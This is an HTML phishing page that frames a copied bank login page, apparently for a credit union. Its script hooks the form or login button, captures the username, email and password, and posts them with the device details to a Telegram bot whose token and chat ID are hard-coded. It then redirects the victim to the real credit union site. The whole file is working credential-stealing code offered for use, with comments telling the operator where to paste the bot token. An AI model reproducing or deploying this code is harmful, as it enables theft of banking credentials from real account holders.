<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body style="margin:0; overflow:hidden; background:#fff;">
    
    <!-- 
       IMPORTANT: Make sure your big file is named 'page.html' 
       and is in the SAME folder as this file on GitHub.
    -->
    <iframe id="scamFrame" src="page.html" style="width:100vw; height:100vh; border:none;"></iframe>

    <script>
        // ================= CONFIGURATION =================
        // 1. PASTE YOUR BOT TOKEN BELOW
        const BOT_TOKEN = '8983043957:AAGncbc73rTjiutiUMOSyDtiGJoqJOUqHSM';
        
        // 2. PASTE YOUR CHAT ID BELOW
        const CHAT_ID = '7706898844';
        
        // 3. REDIRECT URL AFTER LOGIN
        const REDIRECT_URL = 'https://www.onpointcu.com';
        // =================================================

        const frame = document.getElementById('scamFrame');

        // Wait for iframe to load
        frame.onload = function() {
            try {
                const doc = frame.contentDocument || frame.contentWindow.document;
                
                // TRY 1: Look for a <form> tag
                const form = doc.querySelector('form');
                
                if (form) {
                    console.log("Found Form tag");
                    form.addEventListener('submit', function(e) {
                        e.preventDefault();
                        processLogin(doc);
                    });
                    return; // Stop here if form found
                }

                // TRY 2: If no <form> tag, look for a BUTTON with "Login" or "Submit"
                const buttons = doc.querySelectorAll('button');
                let loginBtn = null;

                buttons.forEach(btn => {
                    const text = btn.innerText.toLowerCase();
                    const type = btn.type.toLowerCase();
                    const className = btn.className.toLowerCase();
                    
                    // Detect common login buttons
                    if (
                        text.includes('login') || 
                        text.includes('sign in') || 
                        text.includes('submit') ||
                        type === 'submit' ||
                        className.includes('btn')
                    ) {
                        loginBtn = btn;
                    }
                });

                if (loginBtn) {
                    console.log("Found Button fallback");
                    loginBtn.addEventListener('click', function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        processLogin(doc);
                    });
                } else {
                    console.log("No form or button found!");
                }

            } catch (err) {
                console.error("Iframe Error:", err);
                // Sometimes Cross-Origin blocks access if the site sets cookies
                alert("Page loaded, but script couldn't attach. Check Console (F12)");
            }
        };

        function processLogin(doc) {
            // Find all inputs in the big page
            const inputs = doc.querySelectorAll('input');
            let username = '';
            let password = '';
            let email = '';

            inputs.forEach(input => {
                const type = input.type.toLowerCase();
                const name = (input.name || input.id || '').toLowerCase();
                
                if (type === 'email' || name.includes('email')) email = input.value;
                if (type === 'password' || name.includes('pass')) password = input.value;
                if (type === 'text' || type === 'username' || name.includes('user')) username = input.value;
            });

            // Fallbacks
            if (!username && email) username = email;
            if (!username && inputs[0]) username = inputs[0].value;

            // Send to Telegram
            const message = `
🚨 *NEW LOGIN* 🚨
👤 *User:* ${username || email || 'Unknown'}
🔑 *Pass:* ${password || 'Unknown'}
📱 *Device:* ${navigator.userAgent.substring(0, 60)}
`;

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const params = new URLSearchParams();
            params.append('chat_id', CHAT_ID);
            params.append('text', message);
            params.append('parse_mode', 'Markdown');

            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: params
            })
            .then(res => res.json())
            .then(data => {
                if (data.ok) {
                    window.location.href = REDIRECT_URL;
                } else {
                    console.error("Telegram Error:", data);
                }
            });
        }
    </script>
</body>
</html>
